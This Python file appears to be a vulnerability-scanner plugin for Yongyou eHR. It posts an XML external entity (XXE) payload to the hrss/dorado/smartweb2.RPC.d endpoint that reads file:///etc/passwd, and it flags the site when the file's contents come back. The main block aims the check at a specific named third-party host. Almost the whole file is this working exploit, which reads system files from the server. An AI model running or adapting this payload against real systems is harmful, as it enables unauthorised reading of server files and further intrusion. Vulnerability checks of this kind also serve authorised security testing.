#!/usr/bin/env python
# -*- coding: utf-8 -*-


def assign(service, arg):
    if service == "yongyou_ehr":
        return True, arg

def audit(arg):
    vul_url = arg + 'hrss/dorado/smartweb2.RPC.d?__rpc=true'
    payload = ('__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY test  SYSTEM "file:///etc/passwd" >]><rpc transaction="10" method="resetPwd"><def><dataset type="Custom" id="dsResetPwd"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r id="10008" state="insert"><n><v>1</v></n></r></rs></data><vps><p name="__profileKeys">%26test;</p></vps></rpc>&1404976068948')
    code, _, body, _, _ = curl.curl2(vul_url,post=payload)
    if code == 200 and body.find('/usr/bin/passwd') != -1:
        security_hole(vul_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_ehr', 'http://career.sdebank.com/')[1])